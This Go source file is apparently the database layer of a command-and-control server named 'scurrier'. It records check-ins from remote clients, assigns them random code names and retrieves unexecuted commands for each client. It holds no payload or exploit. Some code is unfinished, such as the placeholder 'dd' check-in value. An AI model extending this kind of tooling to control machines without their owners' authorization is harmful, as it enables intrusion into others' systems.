package server


import (
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"math/rand"
	"fmt"
	"scurrier/types"
)





func (s *Server) LookupIfUserExists(username string, hostname string) (bool, error) {
	query := `SELECT 1 FROM CLIENTS WHERE username = ? AND hostname = ? LIMIT 1`

	var exists int
	err := s.DB.QueryRow(query, username, hostname).Scan(&exists)
	if err != nil {
		if err == sql.ErrNoRows {
			return false, nil
		} 
		return false, err
	}
	return true, nil
}

func gen_string() string {
        str1 := nouns[rand.Intn(len(nouns))]
        str2 := verbs[rand.Intn(len(verbs))]
        return fmt.Sprintf("%s_%s", str1, str2)
}

var (
        verbs = []string {"jump", "run", "walk", "fly", "chase", "catch", "dream", "build", "grow", 
        "swim", "drive", "ride", "seek", "discover", "shine", "ignite", "transform", 
        "explore", "climb", "leap",
    }

    nouns = []string {
        "wolf", "eagle", "mountain", "river", "dream", "star", "fire", "light", 
    "heart", "breeze", "night", "vision", "cloud", "storm", "flame", "earth", 
    "ocean", "soul", "thunder", "horizon",
        }
)




func (s *Server) InsertNewUser(Client *types.ClientInfo, ip string) (bool, error) {
	query := `INSERT INTO clients(guid, code_name, username, hostname, ip, pid, arch, version, last_checkin) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`

	codeName := gen_string()

	_, err := s.DB.Exec(query, Client.Guid, codeName, Client.Username, Client.Hostname, ip, Client.PID, Client.Arch, Client.Version, "dd")
	if err != nil {
		return false, err
	}

	return true, nil
}

type CommandReply struct {
	CommandID uint32
	CommandCode uint32
	Param1 string
	Param2 string
}


// remove all of this, update db, dont need to store commands in DB
func (s *Server) RetrieveCommand(UserGuid string) (*types.CommandReply, error) {
	cmd := &types.CommandReply{}

	//query := `SELECT CommandID, CommandCode, param1, param2 FROM commands where guid = ? AND executed != 0 LIMIT 1`

	err := s.DB.QueryRow("SELECT code, param1, param2, command_id FROM commands WHERE guid=? AND executed != 1 LIMIT 1", UserGuid).Scan(&cmd.CommandCode, &cmd.Param1, &cmd.Param2, &cmd.CommandID)
	if err != nil {
		return nil, err
	}

	return cmd, nil

}
